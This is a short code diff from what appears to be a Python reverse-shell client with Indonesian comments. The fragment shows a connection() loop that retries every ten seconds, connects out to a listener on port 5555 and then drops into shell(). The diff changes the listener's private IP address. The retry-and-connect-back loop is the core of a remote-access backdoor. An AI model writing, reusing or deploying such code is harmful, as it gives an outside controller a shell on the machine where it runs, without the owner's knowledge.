@@ -88,7 +88,7 @@ def connection():
         time.sleep(10) # Jeda 10 detik sebelum mencoba lagi
         try:
              # Coba sambungkan
-             s.connect(("192.168.150.106", 5555))
+             s.connect(("192.168.50.1", 5555))
              print("[+] Connected to server.")
              shell() # Jika berhasil, masuk ke mode shell
              # Jika shell() selesai (karena perintah 'quit'), tutup socket
@@ -102,4 +102,5 @@ def connection():
 
 # --- Program Utama ---
 connection()
+
 
